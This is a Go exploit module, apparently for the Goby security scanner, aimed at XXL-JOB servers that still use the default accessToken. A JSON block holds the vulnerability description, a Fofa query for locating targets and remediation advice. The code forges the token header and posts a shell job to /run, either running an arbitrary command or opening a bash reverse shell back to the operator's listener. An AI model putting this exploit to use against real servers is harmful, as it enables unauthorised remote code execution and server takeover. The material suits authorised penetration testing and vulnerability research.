package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "XXL-JOB  default accessToken Permission bypass Vulnerability",
    "Description": "<p>XXL-JOB is an open source distributed task scheduling platform for large-scale task scheduling and execution.</p><p>XXL-JOB has a default accessToken, which an attacker can use to bypass authentication permissions, invoke executor, and execute arbitrary code to obtain server permissions.</p>",
    "Product": "XXL-JOB",
    "Homepage": "http://www.xuxueli.com/",
    "DisclosureDate": "2023-11-01",
    "PostTime": "2023-11-01",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"invalid request, HttpMethod not support.\"",
    "GobyQuery": "body=\"invalid request, HttpMethod not support.\"",
    "Level": "3",
    "Impact": "<p>XXL-JOB has a default accessToken, which an attacker can use to bypass authentication permissions, invoke executor, and execute arbitrary code to obtain server permissions.</p>",
    "Recommendation": "<p>1. Modify the default value of xxl.job.accessToken in the configuration of the dispatch center and actuator. For details, please refer to: <a href=\"https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3\">https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3</a></p><p>2. Disable the public network from accessing the actuator if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "XXL-JOB  accessToken 权限绕过漏洞",
            "Product": "XXL-JOB",
            "Description": "<p>XXL-JOB 是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。</p><p>XXL-JOB 存在默认 accessToken ，攻击者可使用 accessToken 绕过认证权限，调用 executor，执行任意代码，从而获取服务器权限。</p>",
            "Recommendation": "<p>1.修改调度中心和执行器配置中的 xxl.job.accessToken 默认值。具体请参考：<a href=\"https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3\" target=\"_blank\">https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3</a></p><p>2.如非必要，禁止公网访问执行器端。</p>",
            "Impact": "<p>XXL-JOB 存在默认 accessToken ，攻击者可使用 accessToken 绕过认证权限，调用 executor，执行任意代码，从而获取服务器权限。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "XXL-JOB  default accessToken Permission bypass Vulnerability",
            "Product": "XXL-JOB",
            "Description": "<p>XXL-JOB is an open source distributed task scheduling platform for large-scale task scheduling and execution.</p><p>XXL-JOB has a default accessToken, which an attacker can use to bypass authentication permissions, invoke executor, and execute arbitrary code to obtain server permissions.</p>",
            "Recommendation": "<p>1. Modify the default value of xxl.job.accessToken in the configuration of the dispatch center and actuator. For details, please refer to:&nbsp;<a href=\"https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3\" target=\"_blank\">https://www.xuxueli.com/xxl-job/#5.3.1%20%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3</a></p><p>2. Disable the public network from accessing the actuator if necessary.</p>",
            "Impact": "<p>XXL-JOB has a default accessToken, which an attacker can use to bypass authentication permissions, invoke executor, and execute arbitrary code to obtain server permissions.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10864"
}`

	randomIntStringDQWHELHXC := func(size int) string {
		alpha := "123456789"
		var buffer bytes.Buffer
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	sendPayloadDQWJOPIURHJX := func(hostInfo *httpclient.FixUrl, uri, data string) (bool, error) {
		postRequestConfig := httpclient.NewPostRequestConfig(uri)
		postRequestConfig.Header.Store("XXL-JOB-ACCESS-TOKEN", "default_token")
		postRequestConfig.Data = data
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, `"code":200`), err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			data := fmt.Sprintf(`{"jobId": %s,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 100,"logId": %s,"logDateTime": 1698837908000,"glueType": "GLUE_SHELL","glueSource": "%s","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}`, randomIntStringDQWHELHXC(6), randomIntStringDQWHELHXC(6), "whoami")
			success, _ := sendPayloadDQWJOPIURHJX(hostInfo, "/run", data)
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := godclient.ReverseTCPByBash(rp)
				data := fmt.Sprintf(`{"jobId": %s,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 100,"logId": %s,"logDateTime": 1698837908000,"glueType": "GLUE_SHELL","glueSource": "%s","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}`, randomIntStringDQWHELHXC(6), randomIntStringDQWHELHXC(6), cmd)
				if _, err := sendPayloadDQWJOPIURHJX(expResult.HostInfo, `/run`, data); err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				data := fmt.Sprintf(`{"jobId": %s,"executorHandler": "demoJobHandler","executorParams": "demoJobHandler","executorBlockStrategy": "COVER_EARLY","executorTimeout": 100,"logId": %s,"logDateTime": 1698837908000,"glueType": "GLUE_SHELL","glueSource": "%s","glueUpdatetime": 1586699003758,"broadcastIndex": 0,"broadcastTotal": 0}`, randomIntStringDQWHELHXC(6), randomIntStringDQWHELHXC(6), cmd)
				success, err := sendPayloadDQWJOPIURHJX(expResult.HostInfo, "/run", data)
				if err != nil {
					expResult.Output = err.Error()
				} else if success {
					expResult.Success = true
					expResult.Output = "命令已执行！\n该漏洞无回显。"
				}
			}
			return expResult
		},
	))
}
